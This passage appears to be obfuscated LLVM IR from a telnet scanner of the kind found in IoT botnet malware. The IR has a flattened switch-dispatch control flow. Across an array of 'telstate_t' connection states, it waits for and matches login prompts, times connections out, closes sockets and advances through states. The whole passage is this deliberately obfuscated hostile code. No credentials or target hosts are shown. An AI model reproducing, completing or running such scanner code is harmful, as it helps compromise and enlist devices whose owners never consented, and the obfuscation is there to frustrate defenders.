  %1247 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1246, i32 0, i32 2
  store i8 0, i8* %1247, align 8
  %1248 = load i32, i32* %2, align 4
  %1249 = sext i32 %1248 to i64
  %.reload218 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1250 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload218, i64 %1249
  %1251 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1250, i32 0, i32 3
  store i8 1, i8* %1251, align 1
  store i32 -1653477229, i32* %switchVar
  br label %loopEnd

; <label>:1252:                                   ; preds = %loopEntry
  %1253 = load i32, i32* %2, align 4
  %1254 = sext i32 %1253 to i64
  %.reload217 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1255 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload217, i64 %1254
  %1256 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1255, i32 0, i32 2
  store i8 6, i8* %1256, align 8
  store i32 1068643273, i32* %switchVar
  br label %loopEnd

; <label>:1257:                                   ; preds = %loopEntry
  %1258 = load i32, i32* %2, align 4
  %1259 = sext i32 %1258 to i64
  %.reload216 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1260 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload216, i64 %1259
  %1261 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1260, i32 0, i32 6
  %1262 = load i32, i32* %1261, align 4
  %1263 = icmp eq i32 %1262, 0
  %1264 = select i1 %1263, i32 -1933830239, i32 19231790
  store i32 %1264, i32* %switchVar
  br label %loopEnd

; <label>:1265:                                   ; preds = %loopEntry
  %1266 = call i64 @time(i64* null) #2
  %1267 = trunc i64 %1266 to i32
  %1268 = load i32, i32* %2, align 4
  %1269 = sext i32 %1268 to i64
  %.reload215 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1270 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload215, i64 %1269
  %1271 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1270, i32 0, i32 6
  store i32 %1267, i32* %1271, align 4
  store i32 19231790, i32* %switchVar
  br label %loopEnd

; <label>:1272:                                   ; preds = %loopEntry
  %1273 = load i32, i32* %2, align 4
  %1274 = sext i32 %1273 to i64
  %.reload214 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1275 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload214, i64 %1274
  %1276 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1275, i32 0, i32 0
  %1277 = load i32, i32* %1276, align 16
  %1278 = load i32, i32* %2, align 4
  %1279 = sext i32 %1278 to i64
  %.reload213 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1280 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload213, i64 %1279
  %1281 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1280, i32 0, i32 8
  %1282 = load i8*, i8** %1281, align 8
  %1283 = load i32, i32* %2, align 4
  %1284 = sext i32 %1283 to i64
  %.reload212 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1285 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload212, i64 %1284
  %1286 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1285, i32 0, i32 7
  %1287 = load i16, i16* %1286, align 16
  %1288 = zext i16 %1287 to i32
  %1289 = call i32 @readUntil(i32 %1277, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.63, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1282, i32 1024, i32 %1288)
  %1290 = icmp ne i32 %1289, 0
  %1291 = select i1 %1290, i32 1702816913, i32 -1497267999
  store i32 %1291, i32* %switchVar
  br label %loopEnd

; <label>:1292:                                   ; preds = %loopEntry
  %1293 = load i32, i32* %2, align 4
  %1294 = sext i32 %1293 to i64
  %.reload211 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1295 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload211, i64 %1294
  %1296 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1295, i32 0, i32 6
  store i32 0, i32* %1296, align 4
  %1297 = load i32, i32* %2, align 4
  %1298 = sext i32 %1297 to i64
  %.reload210 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1299 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload210, i64 %1298
  %1300 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1299, i32 0, i32 7
  store i16 0, i16* %1300, align 16
  %1301 = load i32, i32* %2, align 4
  %1302 = sext i32 %1301 to i64
  %.reload209 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1303 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload209, i64 %1302
  %1304 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1303, i32 0, i32 8
  %1305 = load i8*, i8** %1304, align 8
  %1306 = call i8* @strstr(i8* %1305, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.63, i32 0, i32 0)) #10
  %1307 = icmp ne i8* %1306, null
  %1308 = select i1 %1307, i32 1209875802, i32 -1336745509
  store i32 %1308, i32* %switchVar
  br label %loopEnd

; <label>:1309:                                   ; preds = %loopEntry
  %1310 = load i32, i32* %2, align 4
  %1311 = sext i32 %1310 to i64
  %.reload208 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1312 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload208, i64 %1311
  %1313 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1312, i32 0, i32 8
  %1314 = load i8*, i8** %1313, align 8
  call void @llvm.memset.p0i8.i64(i8* %1314, i8 0, i64 1024, i32 1, i1 false)
  %1315 = load i32, i32* %2, align 4
  %1316 = sext i32 %1315 to i64
  %.reload207 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1317 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload207, i64 %1316
  %1318 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1317, i32 0, i32 0
  %1319 = load i32, i32* %1318, align 16
  %1320 = call i32 @sclose(i32 %1319)
  %1321 = load i32, i32* %2, align 4
  %1322 = sext i32 %1321 to i64
  %.reload206 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1323 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload206, i64 %1322
  %1324 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1323, i32 0, i32 2
  store i8 0, i8* %1324, align 8
  %1325 = load i32, i32* %2, align 4
  %1326 = sext i32 %1325 to i64
  %.reload205 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1327 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload205, i64 %1326
  %1328 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1327, i32 0, i32 3
  store i8 0, i8* %1328, align 1
  store i32 -1653477229, i32* %switchVar
  br label %loopEnd

; <label>:1329:                                   ; preds = %loopEntry
  %1330 = load i32, i32* %2, align 4
  %1331 = sext i32 %1330 to i64
  %.reload204 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1332 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload204, i64 %1331
  %1333 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1332, i32 0, i32 8
  %1334 = load i8*, i8** %1333, align 8
  %1335 = call i32 @matchPrompt(i8* %1334)
  %1336 = icmp ne i32 %1335, 0
  %1337 = select i1 %1336, i32 -1112505390, i32 -1598447686
  store i32 %1337, i32* %switchVar
  br label %loopEnd

; <label>:1338:                                   ; preds = %loopEntry
  %1339 = load i32, i32* %2, align 4
  %1340 = sext i32 %1339 to i64
  %.reload203 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1341 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload203, i64 %1340
  %1342 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1341, i32 0, i32 8
  %1343 = load i8*, i8** %1342, align 8
  call void @llvm.memset.p0i8.i64(i8* %1343, i8 0, i64 1024, i32 1, i1 false)
  %1344 = load i32, i32* %2, align 4
  %1345 = sext i32 %1344 to i64
  %.reload202 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1346 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload202, i64 %1345
  %1347 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1346, i32 0, i32 0
  %1348 = load i32, i32* %1347, align 16
  %1349 = call i32 @sclose(i32 %1348)
  %1350 = load i32, i32* %2, align 4
  %1351 = sext i32 %1350 to i64
  %.reload201 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1352 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload201, i64 %1351
  %1353 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1352, i32 0, i32 2
  store i8 0, i8* %1353, align 8
  %1354 = load i32, i32* %2, align 4
  %1355 = sext i32 %1354 to i64
  %.reload200 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1356 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload200, i64 %1355
  %1357 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1356, i32 0, i32 3
  store i8 1, i8* %1357, align 1
  store i32 -1653477229, i32* %switchVar
  br label %loopEnd

; <label>:1358:                                   ; preds = %loopEntry
  %1359 = load i32, i32* %2, align 4
  %1360 = sext i32 %1359 to i64
  %.reload199 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1361 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload199, i64 %1360
  %1362 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1361, i32 0, i32 2
  store i8 7, i8* %1362, align 8
  store i32 -57133709, i32* %switchVar
  br label %loopEnd

; <label>:1363:                                   ; preds = %loopEntry
  %1364 = load i32, i32* %2, align 4
  %1365 = sext i32 %1364 to i64
  %.reload198 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1366 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload198, i64 %1365
  %1367 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1366, i32 0, i32 8
  %1368 = load i8*, i8** %1367, align 8
  call void @llvm.memset.p0i8.i64(i8* %1368, i8 0, i64 1024, i32 1, i1 false)
  store i32 -1653477229, i32* %switchVar
  br label %loopEnd

; <label>:1369:                                   ; preds = %loopEntry
  %1370 = load i32, i32* %2, align 4
  %1371 = sext i32 %1370 to i64
  %.reload197 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1372 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload197, i64 %1371
  %1373 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1372, i32 0, i32 0
  %1374 = load i32, i32* %1373, align 16
  %1375 = load i32, i32* %2, align 4
  %1376 = sext i32 %1375 to i64
  %.reload196 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1377 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload196, i64 %1376
  %1378 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1377, i32 0, i32 8
  %1379 = load i8*, i8** %1378, align 8
  %1380 = load i32, i32* %2, align 4
  %1381 = sext i32 %1380 to i64
  %.reload195 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1382 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload195, i64 %1381
  %1383 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1382, i32 0, i32 7
  %1384 = load i16, i16* %1383, align 16
  %1385 = zext i16 %1384 to i32
  %1386 = call i32 @readUntil(i32 %1374, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.64, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1379, i32 1024, i32 %1385)
  %1387 = icmp ne i32 %1386, 0
  %1388 = select i1 %1387, i32 2102333845, i32 -1809425599
  store i32 %1388, i32* %switchVar
  br label %loopEnd

; <label>:1389:                                   ; preds = %loopEntry
  %1390 = load i32, i32* %2, align 4
  %1391 = sext i32 %1390 to i64
  %.reload194 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1392 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload194, i64 %1391
  %1393 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1392, i32 0, i32 6
  store i32 0, i32* %1393, align 4
  %1394 = load i32, i32* %2, align 4
  %1395 = sext i32 %1394 to i64
  %.reload193 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1396 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload193, i64 %1395
  %1397 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1396, i32 0, i32 7
  store i16 0, i16* %1397, align 16
  %1398 = load i32, i32* %2, align 4
  %1399 = sext i32 %1398 to i64
  %.reload192 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1400 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload192, i64 %1399
  %1401 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1400, i32 0, i32 8
  %1402 = load i8*, i8** %1401, align 8
  %1403 = call i8* @strstr(i8* %1402, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.64, i32 0, i32 0)) #10
  %1404 = icmp ne i8* %1403, null
  %1405 = select i1 %1404, i32 -1285530381, i32 591968256
  store i32 %1405, i32* %switchVar
  br label %loopEnd

; <label>:1406:                                   ; preds = %loopEntry
  %1407 = load i32, i32* %2, align 4
  %1408 = sext i32 %1407 to i64
  %.reload191 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1409 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload191, i64 %1408
  %1410 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1409, i32 0, i32 8
  %1411 = load i8*, i8** %1410, align 8
  call void @llvm.memset.p0i8.i64(i8* %1411, i8 0, i64 1024, i32 1, i1 false)
  %1412 = load i32, i32* %2, align 4
  %1413 = sext i32 %1412 to i64
  %.reload190 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1414 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload190, i64 %1413
  %1415 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1414, i32 0, i32 0
  %1416 = load i32, i32* %1415, align 16
  %1417 = call i32 @sclose(i32 %1416)
  %1418 = load i32, i32* %2, align 4
  %1419 = sext i32 %1418 to i64
  %.reload189 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1420 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload189, i64 %1419
  %1421 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1420, i32 0, i32 2
  store i8 0, i8* %1421, align 8
  %1422 = load i32, i32* %2, align 4
  %1423 = sext i32 %1422 to i64
  %.reload188 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1424 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload188, i64 %1423
  %1425 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1424, i32 0, i32 3
  store i8 0, i8* %1425, align 1
  store i32 -1653477229, i32* %switchVar
  br label %loopEnd

; <label>:1426:                                   ; preds = %loopEntry
  %1427 = load i32, i32* %2, align 4
  %1428 = sext i32 %1427 to i64
  %.reload187 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1429 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload187, i64 %1428
  %1430 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1429, i32 0, i32 8
  %1431 = load i8*, i8** %1430, align 8
  %1432 = call i32 @matchPrompt(i8* %1431)
  %1433 = icmp ne i32 %1432, 0
  %1434 = select i1 %1433, i32 -86078205, i32 1261075385
  store i32 %1434, i32* %switchVar
  br label %loopEnd

; <label>:1435:                                   ; preds = %loopEntry
  %1436 = load i32, i32* %2, align 4
  %1437 = sext i32 %1436 to i64
  %.reload186 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1438 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload186, i64 %1437
  %1439 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1438, i32 0, i32 8
  %1440 = load i8*, i8** %1439, align 8
  call void @llvm.memset.p0i8.i64(i8* %1440, i8 0, i64 1024, i32 1, i1 false)
  %1441 = load i32, i32* %2, align 4
  %1442 = sext i32 %1441 to i64
  %.reload185 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1443 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload185, i64 %1442
  %1444 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1443, i32 0, i32 0
  %1445 = load i32, i32* %1444, align 16
  %1446 = call i32 @sclose(i32 %1445)
  %1447 = load i32, i32* %2, align 4
  %1448 = sext i32 %1447 to i64
  %.reload184 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1449 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload184, i64 %1448
  %1450 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1449, i32 0, i32 2
  store i8 0, i8* %1450, align 8
  %1451 = load i32, i32* %2, align 4
  %1452 = sext i32 %1451 to i64
  %.reload183 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1453 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload183, i64 %1452
  %1454 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1453, i32 0, i32 3
  store i8 1, i8* %1454, align 1
  store i32 -1653477229, i32* %switchVar
  br label %loopEnd

; <label>:1455:                                   ; preds = %loopEntry
  %1456 = load i32, i32* %2, align 4
  %1457 = sext i32 %1456 to i64
  %.reload182 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1458 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload182, i64 %1457
  %1459 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1458, i32 0, i32 2
  store i8 7, i8* %1459, align 8
  store i32 -973307164, i32* %switchVar
  br label %loopEnd

; <label>:1460:                                   ; preds = %loopEntry
  %1461 = load i32, i32* %2, align 4
  %1462 = sext i32 %1461 to i64
  %.reload181 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1463 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload181, i64 %1462
  %1464 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1463, i32 0, i32 8
  %1465 = load i8*, i8** %1464, align 8
  call void @llvm.memset.p0i8.i64(i8* %1465, i8 0, i64 1024, i32 1, i1 false)
  store i32 -1653477229, i32* %switchVar
  br label %loopEnd

; <label>:1466:                                   ; preds = %loopEntry
  %1467 = load i32, i32* %2, align 4
  %1468 = sext i32 %1467 to i64
  %.reload180 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1469 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload180, i64 %1468
  %1470 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1469, i32 0, i32 0
  %1471 = load i32, i32* %1470, align 16
  %1472 = load i32, i32* %2, align 4
  %1473 = sext i32 %1472 to i64
  %.reload179 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1474 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload179, i64 %1473
  %1475 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1474, i32 0, i32 8
  %1476 = load i8*, i8** %1475, align 8
  %1477 = load i32, i32* %2, align 4
  %1478 = sext i32 %1477 to i64
  %.reload178 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1479 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload178, i64 %1478
  %1480 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1479, i32 0, i32 7
  %1481 = load i16, i16* %1480, align 16
  %1482 = zext i16 %1481 to i32
  %1483 = call i32 @readUntil(i32 %1471, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.65, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1476, i32 1024, i32 %1482)
  %1484 = icmp ne i32 %1483, 0
  %1485 = select i1 %1484, i32 303649959, i32 -273640164
  store i32 %1485, i32* %switchVar
  br label %loopEnd

; <label>:1486:                                   ; preds = %loopEntry
  %1487 = load i32, i32* %2, align 4
  %1488 = sext i32 %1487 to i64
  %.reload177 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1489 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload177, i64 %1488
  %1490 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1489, i32 0, i32 6
  store i32 0, i32* %1490, align 4
  %1491 = load i32, i32* %2, align 4
  %1492 = sext i32 %1491 to i64
  %.reload176 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1493 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload176, i64 %1492
  %1494 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1493, i32 0, i32 7
  store i16 0, i16* %1494, align 16
  %1495 = load i32, i32* %2, align 4
  %1496 = sext i32 %1495 to i64
  %.reload175 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1497 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload175, i64 %1496
  %1498 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1497, i32 0, i32 8
  %1499 = load i8*, i8** %1498, align 8
  %1500 = call i8* @strstr(i8* %1499, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.65, i32 0, i32 0)) #10
  %1501 = icmp ne i8* %1500, null
  %1502 = select i1 %1501, i32 -1391678109, i32 -1632501356
  store i32 %1502, i32* %switchVar
  br label %loopEnd

; <label>:1503:                                   ; preds = %loopEntry
  %1504 = load i32, i32* %2, align 4
  %1505 = sext i32 %1504 to i64
  %.reload174 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1506 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload174, i64 %1505
  %1507 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1506, i32 0, i32 8
  %1508 = load i8*, i8** %1507, align 8
  call void @llvm.memset.p0i8.i64(i8* %1508, i8 0, i64 1024, i32 1, i1 false)
  %1509 = load i32, i32* %2, align 4
  %1510 = sext i32 %1509 to i64
  %.reload173 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1511 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload173, i64 %1510
  %1512 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1511, i32 0, i32 0
  %1513 = load i32, i32* %1512, align 16
  %1514 = call i32 @sclose(i32 %1513)
  %1515 = load i32, i32* %2, align 4
  %1516 = sext i32 %1515 to i64
  %.reload172 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1517 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload172, i64 %1516
  %1518 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1517, i32 0, i32 2
  store i8 0, i8* %1518, align 8
  %1519 = load i32, i32* %2, align 4
  %1520 = sext i32 %1519 to i64
  %.reload171 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1521 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload171, i64 %1520
  %1522 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1521, i32 0, i32 3
  store i8 0, i8* %1522, align 1
  store i32 -1653477229, i32* %switchVar
  br label %loopEnd

; <label>:1523:                                   ; preds = %loopEntry
  %1524 = load i32, i32* %2, align 4
  %1525 = sext i32 %1524 to i64
  %.reload170 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1526 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload170, i64 %1525
  %1527 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1526, i32 0, i32 2
  store i8 7, i8* %1527, align 8
  store i32 1138596044, i32* %switchVar
  br label %loopEnd

; <label>:1528:                                   ; preds = %loopEntry
  %1529 = load i32, i32* %2, align 4
  %1530 = sext i32 %1529 to i64
  %.reload169 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1531 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload169, i64 %1530
  %1532 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1531, i32 0, i32 8
  %1533 = load i8*, i8** %1532, align 8
  call void @llvm.memset.p0i8.i64(i8* %1533, i8 0, i64 1024, i32 1, i1 false)
  store i32 -1653477229, i32* %switchVar
  br label %loopEnd

; <label>:1534:                                   ; preds = %loopEntry
  %1535 = load i32, i32* %2, align 4
  %1536 = sext i32 %1535 to i64
  %.reload168 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1537 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload168, i64 %1536
  %1538 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1537, i32 0, i32 0
  %1539 = load i32, i32* %1538, align 16
  %1540 = load i32, i32* %2, align 4
  %1541 = sext i32 %1540 to i64
  %.reload167 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1542 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload167, i64 %1541
  %1543 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1542, i32 0, i32 8
  %1544 = load i8*, i8** %1543, align 8
  %1545 = load i32, i32* %2, align 4
  %1546 = sext i32 %1545 to i64
  %.reload166 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1547 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload166, i64 %1546
  %1548 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1547, i32 0, i32 7
  %1549 = load i16, i16* %1548, align 16
  %1550 = zext i16 %1549 to i32
  %1551 = call i32 @readUntil(i32 %1539, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.66, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1544, i32 1024, i32 %1550)
  %1552 = icmp ne i32 %1551, 0
  %1553 = select i1 %1552, i32 -747233227, i32 -1013795793
  store i32 %1553, i32* %switchVar
  br label %loopEnd

; <label>:1554:                                   ; preds = %loopEntry
  %1555 = load i32, i32* %2, align 4
  %1556 = sext i32 %1555 to i64
  %.reload165 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1557 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload165, i64 %1556
  %1558 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1557, i32 0, i32 6
  store i32 0, i32* %1558, align 4
  %1559 = load i32, i32* %2, align 4
  %1560 = sext i32 %1559 to i64
  %.reload164 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1561 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload164, i64 %1560
  %1562 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1561, i32 0, i32 7
  store i16 0, i16* %1562, align 16
  %1563 = load i32, i32* %2, align 4
  %1564 = sext i32 %1563 to i64
  %.reload163 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1565 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload163, i64 %1564
  %1566 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1565, i32 0, i32 8
  %1567 = load i8*, i8** %1566, align 8
  %1568 = call i8* @strstr(i8* %1567, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.66, i32 0, i32 0)) #10
  %1569 = icmp ne i8* %1568, null
  %1570 = select i1 %1569, i32 542643682, i32 -960611284
  store i32 %1570, i32* %switchVar
  br label %loopEnd

; <label>:1571:                                   ; preds = %loopEntry
  %1572 = load i32, i32* %2, align 4
  %1573 = sext i32 %1572 to i64
  %.reload162 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1574 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload162, i64 %1573
  %1575 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1574, i32 0, i32 8
  %1576 = load i8*, i8** %1575, align 8
  call void @llvm.memset.p0i8.i64(i8* %1576, i8 0, i64 1024, i32 1, i1 false)
  %1577 = load i32, i32* %2, align 4
  %1578 = sext i32 %1577 to i64
  %.reload161 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1579 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload161, i64 %1578
  %1580 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1579, i32 0, i32 0
  %1581 = load i32, i32* %1580, align 16
  %1582 = call i32 @sclose(i32 %1581)
  %1583 = load i32, i32* %2, align 4
  %1584 = sext i32 %1583 to i64
  %.reload160 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1585 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload160, i64 %1584
